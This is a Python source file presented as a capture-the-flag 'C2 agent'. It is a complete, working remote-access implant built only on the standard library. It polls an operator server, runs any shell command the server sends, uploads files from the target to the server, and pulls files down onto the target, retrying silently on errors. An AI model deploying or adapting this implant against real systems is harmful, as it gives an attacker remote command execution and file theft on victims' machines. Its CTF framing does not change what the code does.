#!/usr/bin/env python3
"""
CTF C2 Agent — pure stdlib, no pip install required
====================================================
Configure SERVER, TOKEN, INTERVAL below, then run on target:
    python c2_agent.py

Or pass via environment:
    C2_SERVER=http://IP:8080 C2_TOKEN=mysecret python c2_agent.py

Commands handled automatically:
    <any text>         execute as shell command, return output
    #get <path>        upload file at <path> to server
    #put <filename>    download <filename> from server into cwd
"""

import os, sys, time, subprocess, threading, socket
import urllib.request, urllib.error, json
from pathlib import Path
from datetime import datetime

# ── Config — edit these before deploying ──────────────────────────────────────
SERVER   = os.environ.get("C2_SERVER",   "http://127.0.0.1:8080")
TOKEN    = os.environ.get("C2_TOKEN",    "ctf-token-changeme")
INTERVAL = float(os.environ.get("C2_INTERVAL", "5"))   # beacon every N seconds
TIMEOUT  = 10   # HTTP request timeout

# ── HTTP helpers ──────────────────────────────────────────────────────────────
def _headers(extra=None):
    h = {"X-Token": TOKEN, "X-Host": socket.gethostname()}
    if extra:
        h.update(extra)
    return h

def _get(path, out_path=None):
    """GET SERVER/path.  If out_path given, write response body there."""
    url = SERVER.rstrip("/") + path
    req = urllib.request.Request(url, headers=_headers())
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = resp.read()
            if out_path:
                Path(out_path).write_bytes(body)
                return True
            return body
    except Exception:
        return None

def _post(path, data: bytes, extra_headers=None):
    """POST bytes to SERVER/path."""
    url = SERVER.rstrip("/") + path
    req = urllib.request.Request(url, data=data, headers=_headers(extra_headers), method="POST")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.read()
    except Exception:
        return None

def _post_json(path, obj):
    data = json.dumps(obj).encode()
    return _post(path, data, {"Content-Type": "application/json"})

# ── Command execution ─────────────────────────────────────────────────────────
def _run_shell(cmd: str) -> str:
    """Run a shell command, return combined stdout+stderr."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
            # Use cmd.exe on Windows if available
            executable=("cmd.exe" if sys.platform == "win32" else None),
        )
        out = result.stdout + result.stderr
        return out if out.strip() else "(command completed, no output)"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out after 60s"
    except Exception as e:
        return f"[!] Execution error: {e}"

def _handle_get(remote_path: str):
    """Upload a file from the target to the server."""
    p = Path(remote_path)
    if not p.exists():
        _post_json("/result", {"cmd": f"#get {remote_path}", "output": f"[!] File not found: {remote_path}"})
        return
    try:
        data = p.read_bytes()
        _post(
            "/upload",
            data,
            {"X-Filename": p.name, "Content-Type": "application/octet-stream"},
        )
    except Exception as e:
        _post_json("/result", {"cmd": f"#get {remote_path}", "output": f"[!] Upload error: {e}"})

def _handle_put(filename: str):
    """Download a file from the server into the current directory."""
    out_path = Path(filename).name   # strip any path, write to cwd
    ok = _get(f"/file/{filename}", out_path=out_path)
    if ok:
        _post_json("/result", {"cmd": f"#put {filename}", "output": f"[+] Downloaded to {out_path}"})
    else:
        _post_json("/result", {"cmd": f"#put {filename}", "output": f"[!] Download failed for {filename}"})

# ── Beacon loop ───────────────────────────────────────────────────────────────
def beacon_loop():
    while True:
        try:
            raw = _get("/beacon")
            if raw:
                data = json.loads(raw)
                cmd  = data.get("cmd", "").strip()

                if cmd.startswith("#get "):
                    threading.Thread(target=_handle_get, args=(cmd[5:].strip(),), daemon=True).start()

                elif cmd.startswith("#put "):
                    threading.Thread(target=_handle_put, args=(cmd[5:].strip(),), daemon=True).start()

                elif cmd:
                    # Shell command — run in background, post result when done
                    def _exec(c=cmd):
                        output = _run_shell(c)
                        _post_json("/result", {"cmd": c, "output": output})
                    threading.Thread(target=_exec, daemon=True).start()

        except Exception:
            pass   # silently retry on any error

        time.sleep(INTERVAL)


if __name__ == "__main__":
    beacon_loop()
